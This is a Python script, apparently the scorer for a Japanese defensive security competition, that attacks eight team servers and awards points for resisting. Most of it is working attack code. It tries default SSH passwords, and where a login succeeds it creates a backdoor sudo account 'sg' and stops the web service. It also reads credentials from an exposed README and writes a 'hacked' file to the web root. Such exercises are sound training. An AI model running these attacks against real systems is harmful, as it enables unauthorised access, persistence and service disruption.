import time
from time import sleep
import requests
import threading

import m1_brute
import m2_cred

scoreboard = "localhost"

teams = {
	1: "47.245.10.211",
	2: "47.245.10.212",
	3: "47.245.10.213",
	4: "47.245.10.214",
	5: "47.245.10.215",
	6: "47.245.10.216",
	7: "47.245.10.217",
	8: "47.245.10.218",
}

def chk_alive(team):
	team = int(team)
	q = "http://" + teams[team]
	try:
		r = requests.get(q, timeout=2)
		print("team", team, "is alive: ",q)
		return True
	except:
		print("\033[31mteam", team, "is dead: ",q,"\033[0m")
		return False

# スコアの加算は「http://IP/add?team=ID&score=SCORE」で行う
def add_score(team, points):
	team = str(team)
	points = str(points)
	q = "http://" + scoreboard + "/add?team=" + team + "&score=" + points
	requests.get(q)
	print("team", team, "got points:", points)


# ユーザーへのブルートフォース攻撃

def brute_force(team_id):
	cmd = 'echo {} | sudo -S useradd sg && echo "sg:sg" | sudo chpasswd && sudo usermod -aG sudo sg'
	res = []
	res.append(m1_brute.sshc(team_id, teams[team_id], "root", "root", cmd.format("root")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user11", "pass", cmd.format("pass")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user1", "user1", cmd.format("user2")))
	res.append(m1_brute.sshc(team_id, teams[team_id], "user6", "user6", cmd.format("user6")))
	m1_brute.sshc(team_id, teams[team_id], "sg", "sg", "echo sg | sudo -S systemctl stop http-flask.service")
	if True in res:
		return
	else:
		add_score(team_id, 50) # SSHのブルートフォースによる攻撃を防いだ
	if chk_alive(team_id):
		add_score(team_id, 50) # WEBサーバーを停止されなかった

""" #ブルートフォース攻撃のテスト
for i in range(1, 9):
	threading.Thread(target=brute_force, args=(i,)).start()
#"""

# vsftpdの脆弱性を利用した攻撃

# クレデンシャル情報の流出

def cred_attack(team_id):
	u = "http://" + teams[team_id] + ":8080/README.md"
	try:
		res = requests.get(u, timeout=(3, 7))
		if res.status_code == 200:
			print("\033[31mteam", team_id, "has credential file: ", u,"\033[0m")
			r = m1_brute.sshc(team_id, teams[team_id], "dev", "devpass123", "echo devpass123 | sudo -S sh -c 'echo hacked > /var/www/html/hacked'")
			if r == True:
				print("\033[31mteam", team_id, "was hacked:", u.replace("README.md", "hacked"), "\033[0m")
			else:
				add_score(team_id, 100) # クレデンシャル情報が流出したが、不正な通信がおこらなかった
				print("team", team_id, "could not get hacked")
		else:
			add_score(team_id, 150) # クレデンシャル情報が流出しなかった
			print("team", team_id, "has no credential file: ", u)
	except:
		add_score(team_id, 150) # クレデンシャル情報が流出しなかった
		print("team", team_id, "could not get credentials")

for i in range(1, 9):
	threading.Thread(target=cred_attack, args=(i,)).start()

